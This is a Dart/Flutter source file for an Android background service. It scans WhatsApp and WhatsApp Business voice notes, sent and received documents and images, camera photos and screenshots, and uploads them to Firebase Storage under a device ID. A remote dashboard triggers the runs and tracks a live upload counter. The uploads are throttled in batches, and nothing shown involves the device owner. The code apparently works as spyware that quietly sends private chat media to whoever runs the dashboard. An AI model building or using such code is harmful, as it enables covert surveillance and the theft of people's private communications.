import 'dart:async';
import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';

import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:crypto/crypto.dart';
import 'package:firebase_storage/firebase_storage.dart' as firebase_storage;
import 'package:flutter/foundation.dart';
import 'package:mime/mime.dart';
import 'package:path/path.dart' as path;
import 'package:permission_handler/permission_handler.dart';

import 'config.dart';
import 'local_cursor.dart';
import 'media_config.dart';
import 'worker.dart';

/// Scans device storage for WhatsApp / gallery media and uploads files to
/// Firebase Storage, then tracks each upload in Firestore so duplicates are
/// skipped on re-runs.
///
/// Firebase Storage structure:
/// ```
/// {deviceId}/
///   WhatsApp/
///     voiceNotes/{dateFolder}/{file.opus}
///     documents/Received/{file.pdf}
///     images/Sent/{photo.jpg}
///     audio/Received/{song.mp3}
///   BusinessWhatsApp/
///     ...same layout...
///   gallery/
///     Camera/{IMG_001.jpg}
///     Screenshots/{screen.png}
/// ```
///
/// Called from the WorkManager background isolate with a single [MediaType].
/// The worker runs up to ~9 min (Android background cap). On the next trigger
/// from the dashboard it resumes — already-uploaded files are skipped via the
/// in-memory + Firestore cache, so newest-first ordering means new files land
/// first.
class MediaUploadService {
  MediaUploadService._();

  // ──────────────── In-memory de-dup cache ────────────────
  static final Set<String> _uploadedCache = {};
  static bool _cacheLoaded = false;

  // ──────────────── Progress counters ────────────────
  static int _batchCount = 0;
  static int _totalUploaded = 0;
  static int _liveCount = 0; // files uploaded this session (for live dashboard counter)

  /// Device identifier — top-level folder in Firebase Storage.
  static String? _deviceId;
  static MediaType? _currentType;

  // ══════════════════════════════════════════════════════════
  //  PUBLIC ENTRY POINT — called from the WorkManager worker
  // ══════════════════════════════════════════════════════════

  /// Run a single media-type upload session.  Respects the soft deadline and
  /// batch-size throttling from [AppConfig].
  static Future<void> runUpload(MediaType type) async {
    await ensureFirebase();
    enableFirestorePersistence();

    _deviceId = await LocalCursor.deviceId();
    _currentType = type;
    _liveCount = 0; // reset session counter
    debugPrint('[media] Starting ${type.name} upload for device $_deviceId');

    // Permission check (may prompt on first call).
    if (!await _ensurePermission()) {
      debugPrint('[media] Storage permission denied — aborting');
      return;
    }

    await _loadCache();
    _writeCacheDiag('loadedSize', _uploadedCache.length);

    _batchCount = 0;
    _totalUploaded = 0;
    final start = DateTime.now();

    final dirs = MediaPaths.forType(type);
    final extensions = MediaExtensions.forType(type);
    final isVoice = type == MediaType.voice;

    for (final dirPath in dirs) {
      // Respect the soft deadline.
      if (DateTime.now().difference(start) >= AppConfig.softDeadline) break;

      if (isVoice) {
        await _scanVoiceDirectory(dirPath, extensions, start);
      } else {
        await _scanFlatDirectory(dirPath, extensions, start);
      }
    }

    await _flushCache();
    _writeCacheDiag('finalSize', _uploadedCache.length);
    await _writeStatus(type);

    debugPrint('[media] Done ${type.name}: $_totalUploaded files uploaded');
  }

  // ══════════════════════════════════════════════════════════
  //  PERMISSION
  // ══════════════════════════════════════════════════════════

  static Future<bool> _ensurePermission() async {
    // Android 11+ (SDK 30+): MANAGE_EXTERNAL_STORAGE
    // Android 10 and below: READ_EXTERNAL_STORAGE
    int sdk = 30;
    try {
      final info = await DeviceInfoPlugin().androidInfo;
      sdk = info.version.sdkInt;
    } catch (_) {}

    if (sdk >= 30) {
      final status = await Permission.manageExternalStorage.status;
      return status.isGranted;
    } else {
      final status = await Permission.storage.status;
      return status.isGranted;
    }
  }

  // ══════════════════════════════════════════════════════════
  //  CACHE — stored as a plain text file in app internal storage.
  //  dart:io File write is confirmed to work in WorkManager background
  //  isolates (same mechanism as LocalCursor.deviceId).
  //  Cost: zero. No Firestore reads/writes for cache.
  // ══════════════════════════════════════════════════════════

  static const String _cachePath   = '/data/data/come.tshah.app/files/upload_cache_v2.txt';
  static const int    _maxCacheSize = 5000;

  static Future<void> _loadCache() async {
    if (_cacheLoaded) return;
    try {
      final file = File(_cachePath);
      if (await file.exists()) {
        final raw = await file.readAsString();
        _uploadedCache.addAll(raw.split('\n').where((s) => s.isNotEmpty));
      }
      _cacheLoaded = true;
      debugPrint('[media] Cache loaded: ${_uploadedCache.length} entries');
    } catch (e) {
      debugPrint('[media] Cache load error: $e');
      _cacheLoaded = true;
    }
  }

  static Future<void> _saveToLocalCache(String docId) async {
    _uploadedCache.add(docId);
    unawaited(_flushCache());
  }

  static Future<void> _flushCache() async {
    try {
      final all = _uploadedCache.toList();
      final toSave = all.length > _maxCacheSize
          ? all.sublist(all.length - _maxCacheSize)
          : all;
      final file = File(_cachePath);
      await file.parent.create(recursive: true);
      await file.writeAsString(toSave.join('\n'), flush: true);
      debugPrint('[media] Cache flushed: ${toSave.length} entries');
    } catch (e) {
      debugPrint('[media] Cache flush error: $e');
    }
  }

  // ══════════════════════════════════════════════════════════
  //  VOICE SCANNER (nested date-sub-folders)
  // ══════════════════════════════════════════════════════════

  static Future<void> _scanVoiceDirectory(
    String dirPath,
    Set<String> extensions,
    DateTime start,
  ) async {
    final dir = Directory(dirPath);
    if (!await dir.exists()) return;

    try {
      final dateDirs = dir.listSync();
      _sortByNewest(dateDirs);

      for (final dateDir in dateDirs) {
        if (DateTime.now().difference(start) >= AppConfig.softDeadline) break;
        if (dateDir is! Directory) continue;

        List<FileSystemEntity> files;
        try {
          files = dateDir.listSync();
          _sortByNewest(files);
        } catch (_) {
          continue;
        }

        for (final entity in files) {
          if (DateTime.now().difference(start) >= AppConfig.softDeadline) break;
          if (entity is! File) continue;
          final ext = path.extension(entity.path).toLowerCase();
          if (!extensions.contains(ext)) continue;

          final uploaded = await _processFile(
            entity,
            AppConfig.voiceTrackingCollection,
            _buildVoiceStoragePath(entity),
          );
          if (uploaded) {
            _totalUploaded++;
            await _throttle();
          }
        }
      }
    } catch (e) {
      debugPrint('[media] Voice scan error ($dirPath): $e');
    }
  }

  // ══════════════════════════════════════════════════════════
  //  FLAT MEDIA SCANNER (images, docs, audio, gallery)
  // ══════════════════════════════════════════════════════════

  static Future<void> _scanFlatDirectory(
    String dirPath,
    Set<String> extensions,
    DateTime start,
  ) async {
    final dir = Directory(dirPath);
    if (!await dir.exists()) return;

    try {
      final entities = dir.listSync();
      _sortByNewest(entities);

      for (final entity in entities) {
        if (DateTime.now().difference(start) >= AppConfig.softDeadline) break;

        if (entity is File) {
          final ok = await _processMediaFile(entity, extensions);
          if (ok) _totalUploaded++;
        } else if (entity is Directory) {
          // One level of sub-dirs (e.g. Sent/).
          try {
            final subFiles = entity.listSync();
            _sortByNewest(subFiles);
            for (final sub in subFiles) {
              if (DateTime.now().difference(start) >= AppConfig.softDeadline) {
                break;
              }
              if (sub is File) {
                final ok = await _processMediaFile(sub, extensions);
                if (ok) _totalUploaded++;
              }
            }
          } catch (_) {}
        }
      }
    } catch (e) {
      debugPrint('[media] Flat scan error ($dirPath): $e');
    }
  }

  static Future<bool> _processMediaFile(
    File file,
    Set<String> extensions,
  ) async {
    final ext = path.extension(file.path).toLowerCase();
    if (!extensions.contains(ext)) return false;

    final uploaded = await _processFile(
      file,
      AppConfig.mediaTrackingCollection,
      _buildMediaStoragePath(file),
    );
    if (uploaded) await _throttle();
    return uploaded;
  }

  // ══════════════════════════════════════════════════════════
  //  SINGLE FILE — de-dup → upload → track
  // ══════════════════════════════════════════════════════════

  static Future<bool> _processFile(
    File file,
    String trackingCollection,
    String storagePath,
  ) async {
    final docId = _generateDocId(file.path);

    if (_uploadedCache.contains(docId)) return false;

    // Upload to Firebase Storage.
    try {
      final mimeType = lookupMimeType(file.path) ?? 'application/octet-stream';
      final ref = firebase_storage.FirebaseStorage.instance.ref(storagePath);
      final metadata = firebase_storage.SettableMetadata(contentType: mimeType);
      await ref.putFile(file, metadata);
      debugPrint('[media] Uploaded: $storagePath');
    } catch (e) {
      debugPrint('[media] Upload failed ($storagePath): $e');
      return false;
    }

    await _saveToLocalCache(docId);

    // Live counter: batch update every 5 files to reduce Firestore writes.
    _liveCount++;
    if (_liveCount % 5 == 0) {
      _updateLiveCounter();
    }

    return true;
  }

  // ──────────────── Batch throttle ────────────────
  static Future<void> _throttle() async {
    await Future<void>.delayed(AppConfig.mediaUploadDelay);
    _batchCount++;
    if (_batchCount >= AppConfig.mediaBatchSize) {
      debugPrint(
        '[media] Batch ${AppConfig.mediaBatchSize} reached — cooling down '
        '${AppConfig.mediaBatchCooldown.inMinutes} min',
      );
      await Future<void>.delayed(AppConfig.mediaBatchCooldown);
      _batchCount = 0;
    }
  }

  // ══════════════════════════════════════════════════════════
  //  STORAGE PATH BUILDERS
  // ══════════════════════════════════════════════════════════

  static String _getAppPrefix(String filePath) {
    if (filePath.contains('com.whatsapp.w4b') ||
        filePath.contains('WhatsApp Business')) {
      return 'BusinessWhatsApp';
    }
    if (filePath.contains('com.whatsapp') ||
        filePath.contains('/WhatsApp/')) {
      return 'WhatsApp';
    }
    return 'gallery';
  }

  static String _buildVoiceStoragePath(File file) {
    final id = _deviceId ?? '';
    final app = _getAppPrefix(file.path);
    final dateFolder = path.basename(file.parent.path);
    final fileName = path.basename(file.path);
    return '$id/$app/voiceNotes/$dateFolder/$fileName';
  }

  static String _buildMediaStoragePath(File file) {
    final id = _deviceId ?? '';
    final filePath = file.path;
    final fileName = path.basename(filePath);
    final app = _getAppPrefix(filePath);

    if (app == 'gallery') {
      String sub = 'other';
      if (filePath.contains('DCIM/Camera')) {
        sub = 'Camera';
      } else if (filePath.contains('DCIM')) {
        sub = 'DCIM';
      } else if (filePath.contains('Pictures/Screenshots')) {
        sub = 'Screenshots';
      } else if (filePath.contains('Pictures')) {
        sub = 'Pictures';
      }
      return '$id/gallery/$sub/$fileName';
    }

    String type = 'other';
    String direction = 'Received';
    if (filePath.contains('Documents')) {
      type = 'documents';
    } else if (filePath.contains('Images')) {
      type = 'images';
    } else if (filePath.contains('Audio')) {
      type = 'audio';
    } else if (filePath.contains('Video')) {
      type = 'video';
    }

    if (filePath.contains('/Sent/') || filePath.endsWith('/Sent')) {
      direction = 'Sent';
    }
    return '$id/$app/$type/$direction/$fileName';
  }

  // ──────────────── Helpers ────────────────
  static String _generateDocId(String filePath) {
    final combined = '${_deviceId ?? ''}:$filePath';
    return md5.convert(utf8.encode(combined)).toString();
  }

  static void _sortByNewest(List<FileSystemEntity> entities) {
    try {
      entities.sort((a, b) {
        try {
          return b.statSync().modified.compareTo(a.statSync().modified);
        } catch (_) {
          return 0;
        }
      });
    } catch (_) {}
  }

  // ──────────────── Live counter (after every file) ────────────────
  /// Fire-and-forget update after each file so the dashboard counter
  /// increments in real-time (0→1→2→3…) during the upload session.
  static void _updateLiveCounter() {
    if (_deviceId == null || _currentType == null) return;
    unawaited(
      FirebaseFirestore.instance
          .collection(AppConfig.countersCollection)
          .doc(_deviceId)
          .update({
        'mediaStatus.${_currentType!.name}.live': _liveCount,
        'updatedAt': FieldValue.serverTimestamp(),
      }),
    );
  }

  // ──────────────── Cache diagnostic (visible in Firebase Console) ────────────────
  static void _writeCacheDiag(String key, int value) {
    if (_deviceId == null) return;
    unawaited(
      FirebaseFirestore.instance
          .collection(AppConfig.countersCollection)
          .doc(_deviceId)
          .update({'cacheDiag.$key': value, 'updatedAt': FieldValue.serverTimestamp()}),
    );
  }

  // ──────────────── Device status update ────────────────
  static Future<void> _writeStatus(MediaType type) async {
    if (_deviceId == null) return;
    try {
      final Map<String, dynamic> data = {
        'lastSyncAt': FieldValue.serverTimestamp(),
        'updatedAt':  FieldValue.serverTimestamp(),
      };
      if (_totalUploaded > 0) {
        data['mediaStatus.${type.name}.lastRun']  = FieldValue.serverTimestamp();
        data['mediaStatus.${type.name}.uploaded'] = FieldValue.increment(_totalUploaded);
        data['mediaStatus.${type.name}.live']     = _liveCount;
      }
      await FirebaseFirestore.instance
          .collection(AppConfig.countersCollection)
          .doc(_deviceId)
          .update(data);
    } catch (e) {
      debugPrint('[media] Status write error: $e');
    }
  }
}
